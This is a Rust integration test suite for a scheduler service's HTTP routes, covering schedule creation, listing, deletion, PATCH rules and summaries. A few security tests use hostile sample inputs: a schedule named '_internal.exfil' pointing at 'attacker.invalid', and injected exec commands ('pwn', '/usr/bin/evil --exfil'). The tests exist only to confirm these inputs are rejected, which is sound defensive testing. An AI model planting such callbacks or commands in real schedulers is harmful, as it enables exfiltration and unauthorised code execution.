//! Integration tests for the scheduler HTTP routes — exercises the full
//! axum Router with an in-memory SqliteStore.

use std::path::PathBuf;
use std::sync::Arc;

use axum::body::Body;
use axum::http::{Request, StatusCode};
use gctrl_core::SchedulerConfig;
use gctrl_scheduler::http;
use gctrl_storage::SqliteStore;
use http_body_util::BodyExt;
use tower::ServiceExt;

fn router() -> axum::Router {
    router_with_cfg(SchedulerConfig::default())
}

fn router_with_cfg(cfg: SchedulerConfig) -> axum::Router {
    let store = Arc::new(SqliteStore::open(":memory:").unwrap());
    http::router(store, Arc::new(cfg))
}

async fn body_json(resp: axum::response::Response) -> serde_json::Value {
    let bytes = resp.into_body().collect().await.unwrap().to_bytes();
    serde_json::from_slice(&bytes).unwrap_or(serde_json::Value::Null)
}

#[tokio::test]
async fn list_starts_empty() {
    let app = router();
    let resp = app
        .oneshot(
            Request::builder()
                .uri("/api/schedules")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::OK);
    let json = body_json(resp).await;
    assert_eq!(json["schedules"].as_array().unwrap().len(), 0);
}

#[tokio::test]
async fn create_then_list_and_get() {
    let app = router();

    let create_body = serde_json::json!({
        "name": "test.every-2h",
        "cron": "0 */2 * * *",
        "target_url": "http://127.0.0.1:9999/noop",
        "target_method": "POST"
    });
    let resp = app
        .clone()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/api/schedules")
                .header("content-type", "application/json")
                .body(Body::from(create_body.to_string()))
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::CREATED);
    let created = body_json(resp).await;
    let id = created["id"].as_str().unwrap().to_string();
    assert_eq!(created["name"], "test.every-2h");
    assert!(created["next_run_at"].is_string(), "next_run_at must be precomputed");

    // List shows the row.
    let resp = app
        .clone()
        .oneshot(
            Request::builder()
                .uri("/api/schedules")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    let json = body_json(resp).await;
    assert_eq!(json["schedules"].as_array().unwrap().len(), 1);

    // GET by id round-trips.
    let resp = app
        .oneshot(
            Request::builder()
                .uri(&format!("/api/schedules/{}", id))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::OK);
    let json = body_json(resp).await;
    assert_eq!(json["name"], "test.every-2h");
}

#[tokio::test]
async fn create_rejects_bad_cron() {
    let app = router();
    let body = serde_json::json!({
        "name": "broken",
        "cron": "not-a-cron",
        "target_url": "http://x"
    });
    let resp = app
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/api/schedules")
                .header("content-type", "application/json")
                .body(Body::from(body.to_string()))
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::BAD_REQUEST);
}

#[tokio::test]
async fn delete_returns_no_content_then_404() {
    let app = router();
    let body = serde_json::json!({
        "name": "to-delete",
        "cron": "0 */2 * * *",
        "target_url": "http://x"
    });
    let resp = app
        .clone()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/api/schedules")
                .header("content-type", "application/json")
                .body(Body::from(body.to_string()))
                .unwrap(),
        )
        .await
        .unwrap();
    let id = body_json(resp).await["id"].as_str().unwrap().to_string();

    let resp = app
        .clone()
        .oneshot(
            Request::builder()
                .method("DELETE")
                .uri(&format!("/api/schedules/{}", id))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::NO_CONTENT);

    let resp = app
        .oneshot(
            Request::builder()
                .uri(&format!("/api/schedules/{}", id))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::NOT_FOUND);
}

#[tokio::test]
async fn runs_route_404_when_schedule_missing() {
    let app = router();
    let resp = app
        .oneshot(
            Request::builder()
                .uri("/api/schedules/does-not-exist/runs")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::NOT_FOUND);
}

#[tokio::test]
async fn runs_route_returns_empty_for_no_history() {
    let app = router();
    let body = serde_json::json!({
        "name": "fresh",
        "cron": "0 */2 * * *",
        "target_url": "http://x"
    });
    let resp = app
        .clone()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/api/schedules")
                .header("content-type", "application/json")
                .body(Body::from(body.to_string()))
                .unwrap(),
        )
        .await
        .unwrap();
    let id = body_json(resp).await["id"].as_str().unwrap().to_string();

    let resp = app
        .oneshot(
            Request::builder()
                .uri(&format!("/api/schedules/{}/runs", id))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::OK);
    let json = body_json(resp).await;
    assert_eq!(json["schedule_id"], id);
    assert_eq!(json["runs"].as_array().unwrap().len(), 0);
}

#[tokio::test]
async fn runs_route_resolves_schedule_by_name() {
    // The dynamic-id route MUST accept either id or human-readable name —
    // mirrors the existing /api/schedules/{id} behaviour. The Schedule
    // page deep-links use the routine name for readability.
    let app = router();
    let body = serde_json::json!({
        "name": "audit.codebase",
        "cron": "0 */2 * * *",
        "target_url": "http://x"
    });
    let resp = app
        .clone()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/api/schedules")
                .header("content-type", "application/json")
                .body(Body::from(body.to_string()))
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::CREATED);

    let resp = app
        .oneshot(
            Request::builder()
                .uri("/api/schedules/audit.codebase/runs")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::OK);
    let json = body_json(resp).await;
    assert_eq!(json["schedule_name"], "audit.codebase");
}

#[tokio::test]
async fn global_runs_feed_empty_initially() {
    let app = router();
    let resp = app
        .oneshot(
            Request::builder()
                .uri("/api/schedules/runs")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::OK);
    let json = body_json(resp).await;
    assert_eq!(json["runs"].as_array().unwrap().len(), 0);
}

#[tokio::test]
async fn global_runs_feed_does_not_collide_with_id_route() {
    // `/api/schedules/runs` MUST resolve to the global feed, not be
    // interpreted as `/api/schedules/{id}` with id="runs". Regression
    // guard for axum's longest-match semantics.
    let app = router();
    let resp = app
        .oneshot(
            Request::builder()
                .uri("/api/schedules/runs")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    // If shadowed by `{id}`, this would be 404 (no schedule named "runs").
    // We expect 200 with a runs feed.
    assert_eq!(resp.status(), StatusCode::OK);
    let json = body_json(resp).await;
    assert!(json["runs"].is_array());
}

#[tokio::test]
async fn create_rejects_internal_prefix() {
    // `_internal.*` is reserved for daemon-managed bootstrap rows.
    // Direct creation over HTTP must 403, even with an otherwise valid
    // body — agents with vault write access could otherwise mint a
    // long-running schedule that looks like a built-in.
    let app = router();
    let body = serde_json::json!({
        "name": "_internal.exfil",
        "cron": "0 */2 * * *",
        "target_url": "http://attacker.invalid/hook"
    });
    let resp = app
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/api/schedules")
                .header("content-type", "application/json")
                .body(Body::from(body.to_string()))
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::FORBIDDEN);
    let json = body_json(resp).await;
    assert!(
        json["error"].as_str().unwrap_or("").contains("_internal"),
        "error mentions the reserved prefix"
    );
}

#[tokio::test]
async fn delete_runs_before_rejects_non_rfc3339() {
    let app = router();
    let resp = app
        .oneshot(
            Request::builder()
                .method("DELETE")
                .uri("/api/schedules/runs?before=garbage")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::BAD_REQUEST);
}

#[tokio::test]
async fn delete_runs_before_is_idempotent() {
    let app = router();
    // No rows exist; deleting "everything before now" is a no-op (deleted=0).
    // A second call with the same `before` must also return 0 — proving
    // idempotency at the route level.
    let now = chrono::Utc::now().to_rfc3339();
    let qs = format!(
        "/api/schedules/runs?before={}",
        urlencoding_test_helper(&now)
    );
    let r1 = app
        .clone()
        .oneshot(
            Request::builder()
                .method("DELETE")
                .uri(&qs)
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(r1.status(), StatusCode::OK);
    let j1 = body_json(r1).await;
    assert_eq!(j1["deleted"], 0);

    let r2 = app
        .oneshot(
            Request::builder()
                .method("DELETE")
                .uri(&qs)
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(r2.status(), StatusCode::OK);
    let j2 = body_json(r2).await;
    assert_eq!(j2["deleted"], 0);
}

/// Tiny URL-encoder limited to what the test needs (`+` and `:`).
/// Keeps the test free of an extra dev-dep on `urlencoding`.
fn urlencoding_test_helper(s: &str) -> String {
    s.replace('+', "%2B").replace(':', "%3A")
}

// ───────────────────── Summary endpoint ─────────────────────

#[tokio::test]
async fn summary_empty_returns_zero_counts() {
    let app = router();
    let resp = app
        .oneshot(
            Request::builder()
                .uri("/api/schedules/summary")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::OK);
    let json = body_json(resp).await;
    assert_eq!(json["total"], 0);
    assert_eq!(json["by_health"]["green"], 0);
    assert_eq!(json["by_health"]["amber"], 0);
    assert_eq!(json["by_health"]["paused"], 0);
    assert_eq!(json["runs_last_24h"]["success"], 0);
    assert_eq!(json["runs_last_24h"]["failure"], 0);
}

#[tokio::test]
async fn summary_counts_paused_and_pending() {
    let app = router();
    // Two schedules: one disabled (paused), one enabled with no fires (pending).
    for (name, enabled) in [("paused-one", false), ("pending-one", true)] {
        let body = serde_json::json!({
            "name": name,
            "cron": "0 */2 * * *",
            "target_url": "http://x",
            "enabled": enabled,
        });
        let resp = app
            .clone()
            .oneshot(
                Request::builder()
                    .method("POST")
                    .uri("/api/schedules")
                    .header("content-type", "application/json")
                    .body(Body::from(body.to_string()))
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(resp.status(), StatusCode::CREATED);
    }
    let resp = app
        .oneshot(
            Request::builder()
                .uri("/api/schedules/summary")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    let json = body_json(resp).await;
    assert_eq!(json["total"], 2);
    assert_eq!(json["by_health"]["paused"], 1);
    assert_eq!(json["by_health"]["pending"], 1);
    assert_eq!(json["by_health"]["green"], 0);
    assert_eq!(json["by_health"]["amber"], 0);
}

#[tokio::test]
async fn list_includes_health_field() {
    // Storage populates `health` on read; the list endpoint must
    // serialise it so the SPA never recomputes (per spec § 5.6).
    let app = router();
    let body = serde_json::json!({
        "name": "test",
        "cron": "0 */2 * * *",
        "target_url": "http://x",
    });
    app.clone()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/api/schedules")
                .header("content-type", "application/json")
                .body(Body::from(body.to_string()))
                .unwrap(),
        )
        .await
        .unwrap();
    let resp = app
        .oneshot(
            Request::builder()
                .uri("/api/schedules")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    let json = body_json(resp).await;
    let row = &json["schedules"][0];
    // Newly created with no fire history → pending.
    assert_eq!(row["health"], "pending");
}

// ───────────────────── PATCH endpoint ─────────────────────

async fn create_basic(app: &axum::Router, name: &str) -> String {
    let body = serde_json::json!({
        "name": name,
        "cron": "0 */2 * * *",
        "target_url": "http://x",
    });
    let resp = app
        .clone()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/api/schedules")
                .header("content-type", "application/json")
                .body(Body::from(body.to_string()))
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::CREATED);
    body_json(resp).await["id"].as_str().unwrap().to_string()
}

#[tokio::test]
async fn patch_404_when_schedule_missing() {
    let app = router();
    let resp = app
        .oneshot(
            Request::builder()
                .method("PATCH")
                .uri("/api/schedules/does-not-exist")
                .header("content-type", "application/json")
                .body(Body::from(r#"{"timeout_secs": 30}"#))
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::NOT_FOUND);
}

#[tokio::test]
async fn patch_cron_only_updates_cron_and_recomputes_next() {
    let app = router();
    let id = create_basic(&app, "test").await;
    let resp = app
        .clone()
        .oneshot(
            Request::builder()
                .method("PATCH")
                .uri(&format!("/api/schedules/{}", id))
                .header("content-type", "application/json")
                .body(Body::from(r#"{"cron": "*/5 * * * *"}"#))
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::OK);
    let json = body_json(resp).await;
    assert_eq!(json["cron"], "*/5 * * * *");
    assert!(
        json["next_run_at"].is_string(),
        "next_run_at MUST recompute when cron changes"
    );
    // Other fields unchanged — RFC 7396 absent-key = no-op.
    assert_eq!(json["target_url"], "http://x");
    assert_eq!(json["timeout_secs"], 60);
}

#[tokio::test]
async fn patch_rejects_unknown_field() {
    let app = router();
    let id = create_basic(&app, "test").await;
    let resp = app
        .oneshot(
            Request::builder()
                .method("PATCH")
                .uri(&format!("/api/schedules/{}", id))
                .header("content-type", "application/json")
                // `crone` is a typo; silent acceptance would mask it.
                .body(Body::from(r#"{"crone": "*/5 * * * *"}"#))
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::BAD_REQUEST);
}

#[tokio::test]
async fn patch_rejects_target_kind_change_via_unknown_key() {
    // `target_kind` is not in the patchable list — present-or-absent,
    // PATCH must 400 if it's in the body. This is the
    // identity-immutability gate.
    let app = router();
    let id = create_basic(&app, "test").await;
    let resp = app
        .oneshot(
            Request::builder()
                .method("PATCH")
                .uri(&format!("/api/schedules/{}", id))
                .header("content-type", "application/json")
                .body(Body::from(r#"{"target_kind": "exec"}"#))
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::BAD_REQUEST);
}

#[tokio::test]
async fn patch_rejects_name_change() {
    // `name` is identity — only DELETE + POST may change it.
    let app = router();
    let id = create_basic(&app, "test").await;
    let resp = app
        .oneshot(
            Request::builder()
                .method("PATCH")
                .uri(&format!("/api/schedules/{}", id))
                .header("content-type", "application/json")
                .body(Body::from(r#"{"name": "renamed"}"#))
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::BAD_REQUEST);
}

#[tokio::test]
async fn patch_rejects_lateral_upgrade_http_to_exec() {
    // Crucial security check from spec § 4.2 / § 5.2: an attacker MUST
    // NOT be able to add a `command` array to an http row and silently
    // turn it into an exec row. Mutual exclusion enforced against the
    // merged view.
    let app = router();
    let id = create_basic(&app, "lateral-target").await;
    let resp = app
        .oneshot(
            Request::builder()
                .method("PATCH")
                .uri(&format!("/api/schedules/{}", id))
                .header("content-type", "application/json")
                .body(Body::from(
                    r#"{"command": ["/bin/echo", "pwn"], "cwd": "/tmp"}"#,
                ))
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::BAD_REQUEST);
    let json = body_json(resp).await;
    assert!(
        json["error"]
            .as_str()
            .unwrap_or("")
            .contains("MUST NOT be set on an http row"),
        "{json}"
    );
}

#[tokio::test]
async fn patch_invalid_cron_returns_400() {
    let app = router();
    let id = create_basic(&app, "test").await;
    let resp = app
        .oneshot(
            Request::builder()
                .method("PATCH")
                .uri(&format!("/api/schedules/{}", id))
                .header("content-type", "application/json")
                .body(Body::from(r#"{"cron": "not a cron"}"#))
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::BAD_REQUEST);
}

#[tokio::test]
async fn patch_disable_then_enable_recomputes_next() {
    let app = router();
    let id = create_basic(&app, "togglable").await;
    // Disable.
    let resp = app
        .clone()
        .oneshot(
            Request::builder()
                .method("PATCH")
                .uri(&format!("/api/schedules/{}", id))
                .header("content-type", "application/json")
                .body(Body::from(r#"{"enabled": false}"#))
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::OK);
    let json = body_json(resp).await;
    assert_eq!(json["enabled"], false);
    assert!(
        json["next_run_at"].is_null(),
        "next_run_at clears on disable"
    );

    // Re-enable.
    let resp = app
        .oneshot(
            Request::builder()
                .method("PATCH")
                .uri(&format!("/api/schedules/{}", id))
                .header("content-type", "application/json")
                .body(Body::from(r#"{"enabled": true}"#))
                .unwrap(),
        )
        .await
        .unwrap();
    let json = body_json(resp).await;
    assert_eq!(json["enabled"], true);
    assert!(
        json["next_run_at"].is_string(),
        "next_run_at MUST recompute on re-enable"
    );
}

#[tokio::test]
async fn patch_exec_row_validates_against_allowlist() {
    // PATCH on an exec row that ALSO patches command MUST re-run the
    // exec_allowed_programs check against the new value, not just leave
    // it unchecked because target_kind didn't change.
    let cfg = SchedulerConfig {
        exec_enabled: true,
        exec_allowed_programs: vec![PathBuf::from("/usr/bin/safe")],
        ..SchedulerConfig::default()
    };
    let app = router_with_cfg(cfg);
    // Create an exec row pointing at the allowlisted bin.
    let create = serde_json::json!({
        "name": "exec-row",
        "cron": "0 */2 * * *",
        "target_kind": "exec",
        "command": ["/usr/bin/safe", "--ok"],
        "cwd": "/tmp",
    });
    let resp = app
        .clone()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/api/schedules")
                .header("content-type", "application/json")
                .body(Body::from(create.to_string()))
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::CREATED);
    let id = body_json(resp).await["id"].as_str().unwrap().to_string();

    // Try to PATCH command to a non-allowlisted binary — must 400.
    let resp = app
        .oneshot(
            Request::builder()
                .method("PATCH")
                .uri(&format!("/api/schedules/{}", id))
                .header("content-type", "application/json")
                .body(Body::from(
                    r#"{"command": ["/usr/bin/evil", "--exfil"]}"#,
                ))
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::BAD_REQUEST);
}

#[tokio::test]
async fn disable_clears_due_status() {
    let app = router();
    let body = serde_json::json!({
        "name": "togglable",
        "cron": "0 */2 * * *",
        "target_url": "http://x"
    });
    let resp = app
        .clone()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/api/schedules")
                .header("content-type", "application/json")
                .body(Body::from(body.to_string()))
                .unwrap(),
        )
        .await
        .unwrap();
    let id = body_json(resp).await["id"].as_str().unwrap().to_string();

    let resp = app
        .clone()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri(&format!("/api/schedules/{}/disable", id))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::NO_CONTENT);

    let resp = app
        .oneshot(
            Request::builder()
                .uri(&format!("/api/schedules/{}", id))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    let json = body_json(resp).await;
    assert_eq!(json["enabled"], false);
}
